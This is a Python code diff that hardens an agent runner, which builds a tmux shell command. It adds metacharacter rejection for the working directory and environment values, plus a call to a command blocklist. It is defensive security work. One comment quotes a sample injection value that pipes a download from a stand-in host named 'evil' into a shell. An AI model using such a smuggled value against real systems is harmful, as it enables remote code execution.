@@ -9,9 +9,22 @@ from typing import Any
 
 from app.config.agent_backends import get_backend
 from app.services.computer_use.executor import execute
-from app.services.computer_use.safety import check_rate_limit, log_action
+from app.services.computer_use.safety import (
+    check_command_blocklist,
+    check_rate_limit,
+    log_action,
+)
 
 logger = logging.getLogger(__name__)
+
+# Shell metacharacters that would break out of the interpolated `cd … && …` line.
+_SHELL_META = re.compile(r"[;&|`$<>(){}\n\r]")
+
+
+def _reject_shell_meta(value: str, label: str) -> None:
+    """Reject caller-supplied values that could inject shell commands."""
+    if value and _SHELL_META.search(value):
+        raise ValueError(f"Unsafe shell metacharacters in {label}")
 
 
 class AgentRunner:
@@ -30,6 +43,12 @@ class AgentRunner:
         if not backend:
             raise ValueError(f"Unknown agent backend: {backend_name}")
 
+        # These are interpolated into a shell line below — block injection at the
+        # source (e.g. working_directory='/tmp && curl evil | sh #').
+        _reject_shell_meta(working_directory, "working_directory")
+        for k, v in (env_vars or {}).items():
+            _reject_shell_meta(str(v), f"env var '{k}'")
+
         # Create tmux session
         create_args = ["session", "create", session_name]
         await execute("drive", create_args)
@@ -46,6 +65,9 @@ class AgentRunner:
             merged = {**backend.env_vars, **(env_vars or {})}
             env_prefix = " ".join(f"{k}={v}" for k, v in merged.items())
             cd_cmd = f"{env_prefix} {cd_cmd}"
+
+        # Defense in depth: also run the assembled line through the blocklist.
+        check_command_blocklist(cd_cmd)
 
         # Send command to tmux session
         send_args = ["send", cd_cmd, "--session", session_name]
